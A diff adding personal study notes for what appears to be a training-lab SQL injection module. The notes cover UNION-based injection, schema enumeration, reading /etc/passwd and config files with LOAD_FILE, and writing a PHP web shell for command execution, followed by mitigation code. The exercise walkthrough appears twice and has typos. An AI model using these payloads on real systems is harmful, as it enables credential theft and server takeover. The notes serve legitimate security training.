@@ -792,9 +792,521 @@ The query was successful, and we logged in as admin. The final query as a result
 SELECT * FROM logins where (username='admin')
 The query above is like the one from the previous example and returns the row containing admin.
 
-*Login as the user with the id 5 to get the flagl
+*Login as the user with the id 5 to get the flag:
 
-SELECT * FROM logins WHERE (username='NotAdmin' or '1'='1' AND id > 4) AND password = 'something' or '1'='1';
+'or id=5)#
+password enter whatever you want
+backend will look like:
+SELECT * FROM logins WHERE (username='or id=5)# AND id > 1) AND password = 'something';
+
+#Union Clause
+So far, we have only been manipulating the original query to subvert the web application logic and bypass authentication, using the OR operator and comments. However, another type of SQL injection is injecting entire SQL queries executed along with the original query. This section will demonstrate this by using the MySQL Union clause to do SQL Union Injection.
+
+Union
+Before we start learning about Union Injection, we should first learn more about the SQL Union clause. The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases. Let us try using the UNION operator in a sample database. First, let us see the content of the ports table:
+
+Press enter or click to view image in full size
+
+SELECT * FROM ports;
+Next, let us see the output of the ships tables:
+
+Press enter or click to view image in full size
+
+SELECT * FROM ships;
+Now, let us try to use UNION to combine both results:
+
+Press enter or click to view image in full size
+
+SELECT * FROM ports UNION SELECT * FROM ships;
+As we can see, UNION combined the output of both SELECT statements into one, so entries from the ports table and the ships table were combined into a single output with four rows. As we can see, some of the rows belong to the ports table while others belong to the ships table.
+
+Press enter or click to view image in full size
+
+Note: The data types of the selected columns on all positions should be the same.
+
+Even Columns
+A UNION statement can only operate on SELECT statements with an equal number of columns. For example, if we attempt to UNION two queries that have results with a different number of columns, we get the following error:
+
+Press enter or click to view image in full size
+
+SELECT city FROM ports UNION SELECT * FROM ships;
+The above query results in an error, as the first SELECT returns one column and the second SELECT returns two. Once we have two queries that return the same number of columns, we can use the UNION operator to extract data from other tables and databases.
+
+For example, if the query is:
+
+Press enter or click to view image in full size
+
+SELECT * FROM products WHERE product_id = 'user_input'
+We can inject a UNION query into the input, such that rows from another table are returned:
+
+Press enter or click to view image in full size
+
+SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
+The above query would return username and password entries from the passwords table, assuming the products table has two columns.
+
+Un-even Columns
+We will find out that the original query will usually not have the same number of columns as the SQL query we want to execute, so we will have to work around that. For example, suppose we only had one column. In that case, we want to SELECT, we can put junk data for the remaining required columns so that the total number of columns we are UNIONing with remains the same as the original query.
+
+For example, we can use any string as our junk data, and the query will return the string as its output for that column. If we UNION with the string "junk", the SELECT query would be SELECT "junk" from passwords, which will always return junk. We can also use numbers. For example, the query SELECT 1 from passwords will always return 1 as the output.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+The products table has two columns in the above example, so we have to UNION with two columns. If we only wanted to get one column 'e.g. username', we have to do username, 2, such that we have the same number of columns:
+
+Press enter or click to view image in full size
+
+SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
+If we had more columns in the table of the original query, we have to add more numbers to create the remaining required columns. For example, if the original query used SELECT on a table with four columns, our UNION injection would be:
+
+Press enter or click to view image in full size
+
+UNION SELECT username, 2, 3, 4 from passwords-- '
+This query would return:
+
+Press enter or click to view image in full size
+
+SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
+As we can see, our wanted output of the ‘UNION SELECT username from passwords' query is found at the first column of the second row, while the numbers filled the remaining columns.
+
+*Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): Click here to spawn the target system!
+
+Authenticate to with user “root” and password “password”
+
+Connect to the above MySQL server with the ‘mysql’ tool, and find the number of records returned when doing a ‘Union’ of all records in the ‘employees’ table 
+and all records in the ‘departments’ table (Hint Use the ‘describe’ function to find number and names of columns in each table, to be able to form the proper ‘union’ query).
+
+show databases;
+lets use employees databases
+use employees;
+
+show tables;
+
+To find the number of records returned when doing a ‘Union’ of all records in the ‘employees’ table and all records in the ‘departments’ table
+
+We first need to find the name and number of columns
+
+SELECT * FROM employees;
+
+The result is 6 columns
+
+Will do the same for departments
+
+SELECT * FROM departments;
+
+SELECT * FROM employees;
+
+SELECT * FROM employees UNION SELECT dept_no, dept_name,3,4,5,6 FROM departments;
+Me I did below and same result:
+SELECT * FROM employees UNION SELECT dept_name, 2, 3, 4, 5, 6 FROM departments;
+
+Answer: we can see at the end 663 roows
+
+# Database Enumeration
+
+As we cover MySQL in this module, let us fingerprint MySQL databases. The following queries and their output will tell us that we are dealing with MySQL:
+
+As we saw in the example from the previous section, when we tried @@version, it gave us:
+
+The output 10.3.22-MariaDB-1ubuntu1 means that we are dealing with a MariaDB DBMS similar to MySQL. 
+
+*INFORMATION_SCHEMA Database
+To pull data from tables using UNION SELECT, we need to properly form our SELECT queries. To do so, we need the following information:
+The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server.
+
+List of databases
+List of tables within each database
+List of columns within each table
+
+So, to reference a table present in another DB, we can use the dot '.' operator. For example, to SELECT a table users present in a database named my_database, we can use:
+
+SELECT * FROM my_database.users;
+
+*SCHEMATA
+To start our enumeration, we should find what databases are available on the DBMS. 
+The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server
+The SCHEMA_NAME column contains all the database names currently present.
+
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
+Now, let’s do the same using a UNION SQL injection, with the following payload:
+
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+
+We can find the current database with the SELECT database() query. We can do this similarly to how we found the DBMS version in the previous section:
+
+cn' UNION select 1,database(),2,3-- -
+
+We see that the database name is ilfreight. However, the other database (dev) looks interesting:
+
+*TABLES
+Before we dump data from the dev database, we need to get a list of the tables to query them with a SELECT statement. 
+To find all tables within a database, we can use the TABLES table in the INFORMATION_SCHEMA Database.
+
+The TABLES table contains information about all tables throughout the database. This table contains multiple columns, 
+but we are interested in the TABLE_SCHEMA and TABLE_NAME columns. 
+The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to. 
+
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+
+Result: We see four tables in the dev database, namely credentials, framework, pages, and posts so credentials table could contain sensitive info
+
+*COLUMNS
+To dump the data of the credentials table, we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA database. 
+The COLUMNS table contains information about all columns present in all the databases. This helps us find the column names to query a table for. 
+The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this
+
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+
+Result: The table has two columns named username and password. We can use this information and dump data from the table.
+
+*Data
+Now that we have all the information, we can form our UNION query to dump data of the username and password columns from the credentials table in the dev database. 
+We can place username and password in place of columns 2 and 3:
+
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
+
+What is the password hash for ‘newuser’ stored in the ‘users’ table in the ‘ilfreight’ database
+
+cn' UNION select 1, username, password, 4 from users-- -
+cn' UNION select 1, user(),3,4 from dev.credentials-- -        user(): Fetches the current database user, to be returned in the second column
+
+# Reading Files 
+Reading and writing files on the server and even gaining remote code execution on the back-end server.
+
+*Privileges
+
+Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMS
+MySQL, the DB user must have the FILE privilege to load a file’s content into a table and then dump data from that table and read files. 
+So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.
+
+*DB User
+If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges
+To be able to find our current DB user, we can use any of the following queries:
+
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+
+cn' UNION SELECT 1, user(), 3, 4-- -
+cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+result: root@localhost
+
+*User Privileges
+
+Now that we know our user, we can start looking for what privileges we have with that user. 
+First of all, we can test if we have super admin privileges with the following query:
+
+SELECT super_priv FROM mysql.user
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+
+If we had many users within the DBMS, we can add WHERE user=”root” to only show privileges for our current user root:
+
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+
+The query returns Y, which means YES, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:
+
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+
+From here, we can add WHERE grantee="'root'@'localhost'"      (to only show our current user root list of privileges. Our payload would be):
+
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"
+
+*LOAD_FILE
+Now that we know we have enough privileges to read local system files, let us do that using the LOAD_FILE() function. 
+The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files.
+
+SELECT LOAD_FILE('/etc/passwd');
+
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+
+We know that the current page is search.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.
+
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+
+However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting [Ctrl + U] / F12
+
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -      (contain db password usually...)
+
+-- -: The — sequence is used to comment out the rest of the original SQL query. Everything after — is ignored by the database engine, ensuring that only the injected query runs.
+
+# Writing Files
+
+When it comes to writing files to the back-end server, it becomes much more restricted in modern DBMSes, since we can utilize this to write a web shell on the remote server, 
+hence getting code execution and taking over the server; modern DBMSes disable file-write by default and require certain privileges for DBA’s to write files. 
+Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.
+
+*Write File Privileges
+
+User with FILE privilege enabled
+MySQL global secure_file_priv variable not enabled
+Write access to the location we want to write to on the back-end server
+
+We have already found that our current user has the FILE privilege necessary to write files. 
+We must now check if the MySQL database has that privilege. This can be done by checking the secure_file_priv global variable.
+
+*secure_file_priv
+
+The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. 
+Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory. 
+MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. 
+However, MySQL uses /var/lib/mysql-files as the default folder. This means that reading files through a MySQL injection isn’t possible with default settings. 
+Even worse, some modern configurations default to NULL, meaning that we cannot read/write files anywhere within the system.
+
+So, let’s see how we can find out the value of secure_file_priv. Within MySQL:
+
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+However, as we are using a UNION injection, we have to get the value using a SELECT statement. This shouldn’t be a problem, as all variables and most configurations’ are stored 
+within the INFORMATION_SCHEMA database. 
+MySQL global variables are stored in a table called global_variables, and as per the documentation, this table has two columns variable_name and variable_value.
+
+We have to select these two columns from that table in the INFORMATION_SCHEMA database. There are hundreds of global variables in a MySQL configuration, and we don’t want to retrieve all 
+of them. We will then filter the results to only show the secure_file_priv variable, using the WHERE clause
+
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+(Remember to add two more columns 1 & 4 as junk data to have 4 columns’
+
+And the result shows that the secure_file_priv value is empty, meaning that we can read/write files to any location
+
+*SELECT INTO OUTFILE
+
+Now that we have confirmed that our user should write files to the back-end server, let’s try to do that using the SELECT .. INTO OUTFILE statement.
+The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.
+
+To use it, we can add INTO OUTFILE '…' after our query to export the results into the file we specified. 
+The below example saves the output of the users table into the /tmp/credentials file:
+
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+cat /tmp/credentials  (on backend MariaDB)
+
+It is also possible to directly SELECT strings into files, allowing us to write arbitrary files to the back-end server.
+
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+
+As we can see above, the test.txt file was created successfully and is owned by the mysql user. (adavanced file exports fir long files, binary use: 'FROM_BASE64("base64_data")'
+
+*Writing Files through SQL Injection
+
+Let’s try writing a text file to the webroot and verify if we have write permissions. 
+The below query should write file written successfully! to the /var/www/html/proof.txt file, which we can then access on the web application:
+
+select 'file written successfully!' into outfile '/var/www/html/proof.txt'
+
+To write a web shell must know WebRoot of the server, on way use LOAD_FILE to read server config:
+
+/etc/apache2/apache2.conf
+/etc/mginx/nginx.comf
+%WinDir%\System32\Inetsrv\Config\ApplicationHost.config
+
+WebRoot of the server can be find also via fuzzing to discover web folder you can write or server error to determine the web directory
+
+The UNION injection payload would be as follows:
+
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+
+We don’t see any errors on the page, which indicates that the query succeeded. Checking for the file proof.txt in the webroot
+
+*Writing a Web Shell
+Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. 
+We can write the following PHP webshell to be able to execute commands directly on the back-end server:
+
+<?php system($_REQUEST[0]); ?>
+
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+
+Once again, we don’t see any errors, which means the file write probably worked. 
+This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL:
+
+http://serverip/shell.php?0=id
+
+Find the flag by using a webshell (Hint It’s one directory away from you!).
+
+Start with creating a basic PHP web shell (shell.php) on the server directory.
+
+cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"", "" INTO OUTFILE '/var/www/html/shell.php'-- -
+
+http://serverip/shell.php?0=id
+http://serverip/shell.php?0=ls
+http://serverip/shell.php?0=ls ..
+http://serverip/shell.php?0=cat ../flag.txt
+http://serverip/shell.php?0=cat ../../etc/passwd
+
+# Mitigations
+Mitigating SQL Injection avoid these types of vulnerabilities in our code and patch them when found
+
+*Input Sanitization
+As we can see, the script takes in the username and password from the POST request and passes it to the query directly. 
+This will let an attacker inject anything they wish and exploit the application. Injection can be avoided by sanitizing any user input, rendering injected queries useless. 
+Libraries provide multiple functions to achieve this, one such example is the mysqli_real_escape_string() function. 
+This function escapes characters such as ‘ and “, so they don’t hold any special meaning.
+
+<SNIP>
+$username = mysqli_real_escape_string($conn, $_POST['username']);
+$password = mysqli_real_escape_string($conn, $_POST['password']);
+
+$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
+echo "Executing query: " . $query . "<br /><br />";
+<SNIP>
+
+The snippet above shows how the function can be used.As expected, the injection no longer works due to escaping the single quotes. 
+A similar example is the pg_escape_string() which used to escape PostgreSQL queries.
+
+*Input Validation
+User input can also be validated based on the data used to query to ensure that it matches the expected input. 
+For example, when taking an email as input, we can validate that the input is in the form of …@email.com, and so on.
+
+Consider the following code snippet from the ports page, which we used UNION injections on:
+
+<?php
+if (isset($_GET["port_code"])) {
+ $q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
+ $result = pg_query($conn,$q);
+ 
+ if (!$result)
+ {
+ die("</table></div><p style='font-size: 15px;'>" . pg_last_error($conn). "</p>");
+ }
+<SNIP>
+?>
+
+We see the GET parameter port_code being used in the query directly. It’s already known that a port code consists only of letters or spaces. 
+We can restrict the user input to only these characters, which will prevent the injection of queries. A regular expression can be used for validating the input:
+
+<SNIP>
+$pattern = "/^[A-Za-z\s]+$/";
+$code = $_GET["port_code"];
+if(!preg_match($pattern, $code)) {
+ die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
+}
+$q = "Select * from ports where port_code ilike '%" . $code . "%'";
+<SNIP>
+
+The code is modified to use the preg_match() function, which checks if the input matches the given pattern or not. 
+The pattern used is [A-Za-z\s]+, which will only match strings containing letters and spaces. Any other character will result in the termination of the script.
+
+We can test the following injection & result As seen in the images above, input with injected queries was rejected by the server.
+
+'; SELECT 1,2,3,4 - -
+
+*User Privileges
+
+As discussed initially, DBMS software allows the creation of users with fine-grained permissions. We should ensure that the user querying the database only has minimum permissions.
+Superusers and users with administrative privileges should never be used with web applications. These accounts have access to functions and features, which could lead to server compromise.
+
+*Web Application Firewall
+
+Web Application Firewalls (WAF) are used to detect malicious input and reject any HTTP requests containing them. 
+This helps in preventing SQL Injection even when the application logic is flawed. WAFs can be open-source (ModSecurity) or premium (Cloudflare). 
+Most of them have default rules configured based on common web attacks. For example, any request containing the string INFORMATION_SCHEMA would be rejected, as used to exploit sqli
+
+*Parameterized Queries
+
+Another way to ensure that the input is safely sanitized is by using parameterized queries. Parameterized queries contain placeholders for the input data, 
+which is then escaped and passed on by the drivers. Instead of directly passing the data into the SQL query, we use placeholders and then fill them with PHP functions.
+
+<SNIP>
+ $username = $_POST['username'];
+ $password = $_POST['password'];
+$query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
+ $stmt = mysqli_prepare($conn, $query);
+ mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
+ mysqli_stmt_execute($stmt);
+ $result = mysqli_stmt_get_result($stmt);
+$row = mysqli_fetch_array($result);
+ mysqli_stmt_close($stmt);
+<SNIP>
+
+The query is modified to contain two placeholders, marked with ? where the username and password will be placed. We then bind the username and password to the query 
+using the mysqli_stmt_bind_param() function. This will safely escape any quotes and place the values in the query.
+
+Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. 
+Submit the contents of the flag as your answer (Hint Try to read files you know to find a location you can write to).
+
+First will try authentication bypass
+admin' or '1'='1
+admin' or '1'='1'-- -
+
+Second once in test the Search Bar for SQL Injection
+
+'UNION SELECT 1-- -
+
+“The used SELECT statements have a different number of columns” indicates that your SQL injection query failed because the number of columns in your injected UNION SELECT query 
+doesn't match the number of columns returned by the original query.
+Add columns to the UNION SELECT query until the error message disappears.
+
+' UNION SELECT 1,2,3,4-- -
+
+The result is that the correct number of columns (4 columns)
+
+' UNION SELECT 1,@@version,3,4-- -
+cn' UNION SELECT 1, schema_name, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
+
+Now craft SQL injection query that writes the text 'file written successfully!' into a file located at /var/www/html/dashboard/proof.txt on the server.
+
+' UNION SELECT 1, 'file written successfully!', 3, 4 INTO OUTFILE '/var/www/html/proof.txt'-- -
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+
+
+the result didn't show an error the file write prabbly worked, check Open web browser and navigate to http://<Target_IP>/dashboard/proof.txt
+
+*Creating a Web Shell
+
+' UNION SELECT 1, 2, '<?php system($_REQUEST[0]); ?>', 4 INTO OUTFILE '/var/www/html/shell.php'-- -
+
+the result didn't show an error the file write probably worked so Open web browser and navigate to http://<Target_IP>/dashboard/shell.php?0=ls /
+
+http://<Target_IP>/dashboard/shell.php?0=ls ..
+http://94.237.57.1:40543/shell.php?0=cat%20../flag.txt
+
+#SQL last exercice:
+Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system
+
+
+Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. 
+Submit the contents of the flag as your answer (Hint Try to read files you know to find a location you can write to).
+
+First will try authentication bypass
+admin' or '1'='1
+admin' or '1'='1'-- -
+
+Second once in test the Search Bar for SQL Injection
+
+'UNION SELECT 1-- -
+
+“The used SELECT statements have a different number of columns” indicates that your SQL injection query failed because the number of columns in your injected UNION SELECT query 
+doesn't match the number of columns returned by the original query.
+Add columns to the UNION SELECT query until the error message disappears.
+
+' UNION SELECT 1,2,3,4-- -
+
+The result is that the correct number of columns (4 columns)
+
+' UNION SELECT 1,@@version,3,4,5-- -
+cn' UNION SELECT 1, schema_name, 3, 4, 5 FROM INFORMATION_SCHEMA.SCHEMATA-- -
+
+Now craft SQL injection query that writes the text 'file written successfully!' into a file located at /var/www/html/dashboard/proof.txt on the server.
+
+' UNION SELECT 1, 'file written successfully!', 3, 4,5 INTO OUTFILE '/var/www/html/proof.txt'-- -
+cn' union select 1,'file written successfully!',3,4,5 into outfile '/var/www/html/proof.txt'-- -
+
+
+the result didn't show an error the file write prabbly worked, check Open web browser and navigate to http://<Target_IP>/dashboard/proof.txt
+
+*Creating a Web Shell
+
+' UNION SELECT 1, 2, '<?php system($_REQUEST[0]); ?>', 4,5 INTO OUTFILE '/var/www/html/shell.php'-- -
+
+the result didn't show an error the file write probably worked so Open web browser and navigate to http://<Target_IP>/dashboard/shell.php?0=ls /
+
+http://<Target_IP>/dashboard/shell.php?0=ls ..
+http://94.237.57.1:40543/shell.php?0=cat%20../flag.txt
+
+
 
 -----------------------------------------------------------------------------------------------------------
 -Search in CWE list quick access on the 2023 CWE Top 25 most dangerous weakness ID of the last entry:
@@ -2318,6 +2830,7 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
 
 
